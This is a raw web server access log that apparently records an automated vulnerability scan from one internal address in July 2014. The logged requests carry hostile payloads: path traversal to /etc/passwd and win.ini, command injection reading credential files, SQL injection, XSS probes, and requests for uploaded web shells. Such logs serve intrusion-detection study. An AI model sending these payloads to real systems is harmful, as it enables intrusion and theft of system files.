192.168.202.1 - - [19/Jul/2014:03:28:17 +0800] "GET /scripts/htsearch?exclude=%60/etc/passwd%60 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:17 +0800] "GET /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "POST /horde/services/javascript.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /robots.txt HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /SSI/index.htm HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "POST / HTTP/1.0" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /pls/sample/admin_/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /pls/help/<SCRIPT>alert(document.domain)</SCRIPT> HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /cgi-bin/bb-hist.sh?HISTFILE=../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "POST /havalite/havalite/upload.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /havalite/havalite/tmp/files/abcdef1234.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /havalite/havalite/tmp/files/sh.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /scripts/bb-hist.sh?HISTFILE=../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /login.action HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /confluence/login.action HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /wiki/login.action HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /cgi-bin/login.action HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:18 +0800] "GET /scripts/login.action HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:21 +0800] "GET /invoker/JMXInvokerServlet HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:21 +0800] "GET /piwigo/install.php?dl=/../../local/config/index.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:21 +0800] "GET /install.php?dl=/../../local/config/index.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:21 +0800] "GET /gui HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:23 +0800] "GET /member/ajax_membergroup.php?action=post&membergroup=@`'` Union select userid from `%23@__admin` where 1 or id=@`'` HTTP/1.1" 505 -
192.168.202.1 - - [19/Jul/2014:03:28:23 +0800] "RSAS / HTTP/1.0" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:23 +0800] "GET /index.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:24 +0800] "GET /WEB-INF./web.xml HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:24 +0800] "GET /cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:24 +0800] "GET /scripts/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:24 +0800] "GET /?sql_debug=1 HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:24 +0800] "GET /server-status HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:24 +0800] "GET /cgi-bin/auktion.cgi?menue=../../../../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:24 +0800] "GET /scripts/auktion.cgi?menue=../../../../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:27 +0800] "GET /cfanywhere/index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:27 +0800] "GET /docs/servlets/index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:27 +0800] "GET /jsp/index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:27 +0800] "GET /webl/index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:27 +0800] "GET /RsasTest639603294.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:27 +0800] "GET /cgi-bin/webplus?script=/../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:28 +0800] "GET /scripts/webplus?script=/../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [01/Jan/1970:07:59:59 +0800] "-" 400 -
192.168.202.1 - - [01/Jan/1970:07:59:59 +0800] "-" 400 -
192.168.202.1 - - [01/Jan/1970:07:59:59 +0800] "-" 400 -
192.168.202.1 - - [01/Jan/1970:07:59:59 +0800] "-" 400 -
192.168.202.1 - - [19/Jul/2014:03:28:30 +0800] "GET /struts2-blank/example/HelloWorld.action?redirect:http://www.baidu.com/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:32 +0800] "GET /bin/cgicso?query=AAA HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:32 +0800] "GET /cgi-local/cgiemail-1.4/cgicso?query=AAA HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:32 +0800] "GET /cgi-local/cgicso?query=AAA HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:32 +0800] "GET /cgi/cgiemail/cgicso?query=AAA HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:32 +0800] "GET /html/cgi-bin/cgicso?query=AAA HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:32 +0800] "GET /cgi-local/cgiemail-1.6/cgicso?query=AAA HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:32 +0800] "GET /cgi-bin/cgicso?query=AAA HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:32 +0800] "GET /scripts/cgicso?query=AAA HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "Secure * Secure-HTTP/1.4" 505 -
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /examples/jsp/snp/anything.snp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /pafiledb/includes/team/file.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /phpBB/index.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "POST /WANem/result.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /samples/quickstart/docs/index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /cgi-bin/cvsweb.cgi HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /scripts/cvsweb.cgi HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "POST /spywall/blocked_file.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /spywall/images/upload/temp/temp.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /./WEB-INF/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /.FBCIndex HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "POST /narcissus-master/backend.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "GET /CVS/Entries HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "POST /perl/ HTTP/1.1" 400 -
192.168.202.1 - - [19/Jul/2014:03:28:33 +0800] "POST /cgi-bin/Web_store/web_store.cgi HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /RsasTest982394523.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /cgi-bin/whois.cgi?action=load&whois=%3Bid HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /scripts/whois.cgi?action=load&whois=%3Bid HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /cgi-bin/ftp/ftp.pl?dir=../../../../../../etc HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /scripts/dbman/db.cgi?db=no-db HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /scripts/ftp/ftp.pl?dir=../../../../../../etc HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /RsasTest1393062806.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /nuke/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /demo/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /phpnuke/html/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /php_nuke/html/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /php/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /phpnew/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /nuke50/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /nuke60/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /nuke65/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /cgi-bin/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /scripts/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "PUT /zauroscantestn123321d.html HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:34 +0800] "GET /zauroscantestn123321d.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:35 +0800] "GET /dcforum/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:35 +0800] "GET /cgi-bin/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:35 +0800] "GET /scripts/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /nuke/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /demo/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /phpnuke/html/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /php_nuke/html/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /php/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /phpnew/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /nuke50/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /nuke50/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /nuke50/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /RsasTest578822377.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /scripts/simple/view_page?mv_arg=|cat%20/etc/passwd| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:36 +0800] "GET /:/x.jsp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:41 +0800] "GET /cgi-bin/commerce.cgi?page=../../../../../etc/passwd%00index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:41 +0800] "GET /scripts/commerce.cgi?page=../../../../../etc/passwd%00index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:41 +0800] "GET /servlet/org.apache.catalina.ContainerServlet/<DEFANGED_SCRIPT>alert(document.domain)</DEFANGED_SCRIPT> HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:42 +0800] "POST /openemr/library/openflashchart/php-ofc-library/ofc_upload_image.php?name=smallsmallbird.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:42 +0800] "POST /news/ashnews.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:42 +0800] "GET /%00 HTTP/1.1" 400 -
192.168.202.1 - - [19/Jul/2014:03:28:42 +0800] "HEAD / HTTP/1.0" 200 -
192.168.202.1 - - [19/Jul/2014:03:28:42 +0800] "GET /cgi-bin/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:42 +0800] "GET /scripts/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:51 +0800] "GET /cgi-bin/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:51 +0800] "GET /scripts/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /whatsnew.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /cgi-bin/awstats.pl?configdir=%7Ccat%20/etc/passwd;\n%7C HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /statistics/awstats.pl?configdir=%7Ccat%20/etc/passwd;\n%7C HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /awstats/awstats.pl?configdir=%7Ccat%20/etc/passwd;\n%7C HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /cgi-bin/awstats/awstats.pl?configdir=%7Ccat%20/etc/passwd;\n%7C HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /phpBB2/viewtopic.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /cgi-bin/htsearch?-c/nonexistent HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /forum/viewtopic.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /scripts/htsearch?-c/nonexistent HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /forums/viewtopic.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /phpBB/viewtopic.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /viewtopic.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /phpbb/viewtopic.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /bbs/viewtopic.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /cgi-bin/loadpage.cgi?user_id=1&file=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /cgi-bin/loadpage.cgi?user_id=1&file=..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /cgi-bin/search.cgi?user_id=1&database=..\..\..\..\..\..\..\..\winnt\win.ini&template=..\..\..\..\..\..\..\winnt\win.ini&distinct=1 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET GET /cgi-bin/loadpage.cgi?user_id=1&file=../../../../../../etc/passwd HTTP/1.1" 505 -
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /scripts/loadpage.cgi?user_id=1&file=../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /cgi-bindirectory.php?dir=%3Bcat%20/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /scripts/loadpage.cgi?user_id=1&file=..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /scriptsdirectory.php?dir=%3Bcat%20/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /way-board/way-board.cgi?db=/etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /scripts/search.cgi?user_id=1&database=..\..\..\..\..\..\..\..\winnt\win.ini&template=..\..\..\..\..\..\..\winnt\win.ini&distinct=1 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET GET /scripts/loadpage.cgi?user_id=1&file=../../../../../../etc/passwd HTTP/1.1" 505 -
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /cgi-bin/way-board/way-board.cgi?db=/etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /scripts/way-board/way-board.cgi?db=/etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET /.DS_Store HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:52 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:53 +0800] "GET /demo/ojspext/events/globals.jsa HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "ANY /appServer/jvmReport.jsf HTTP/1.1" 501 1116
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET /servlet/org.apache.catalina.servlets.DefaultServlet/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET /servlet/org.apache.catalina.servlets.DefaultServlet/index.jsp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET /servlet/org.apache.catalina.servlets.DefaultServlet/default.jsp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET /servlet/org.apache.catalina.servlets.DefaultServlet/index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET /servlet/org.apache.catalina.servlets.DefaultServlet/profile.jsp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET /servlet/org.apache.catalina.servlets.DefaultServlet/sort.jsp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET /servlet/org.apache.catalina.servlets.DefaultServlet/topic.jsp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET /servlet/org.apache.catalina.servlets.DefaultServlet/cgi-bin/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:54 +0800] "GET /servlet/org.apache.catalina.servlets.DefaultServlet/scripts/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:56 +0800] "GET /cgi-bin/calendar_admin.pl?config=|cat%20/etc/passwd| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:56 +0800] "GET /cgi-bin/calendar/calendar_admin.pl?config=|cat%20/etc/passwd| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:56 +0800] "GET /cgi-bin/calendar/calender.pl?config=|cat%20/etc/passwd| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:56 +0800] "GET /scripts/calendar_admin.pl?config=|cat%20/etc/passwd| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:56 +0800] "GET /scripts/calendar/calendar_admin.pl?config=|cat%20/etc/passwd| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:57 +0800] "GET /scripts/calendar/calender.pl?config=|cat%20/etc/passwd| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:22 +0800] "POST /webcalendar/week.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:48:23 +0800] "GET /status HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:23 +0800] "GET /RsasTest997135353.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:23 +0800] "GET /admin/contextAdmin/contextList.jsp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:23 +0800] "GET /piranha/secure/control.php3? HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:23 +0800] "GET /piranha/secure/control.php3? HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:23 +0800] "GET /DB4Web/www.microsoft.com:23/foo HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:24 +0800] "GET //sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:24 +0800] "GET //sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:24 +0800] "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:24 +0800] "GET /phpPgAdmin/sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:24 +0800] "GET /phpPgAdmin/sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:24 +0800] "GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:24 +0800] "GET /sql.php?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:24 +0800] "GET /cgi-bin/sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:25 +0800] "GET /sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:25 +0800] "GET /sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:25 +0800] "GET /phpMyAdmin/sql.php?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:25 +0800] "GET /phpMyAdmin/sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:48:25 +0800] "GET /scripts/sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 200 97
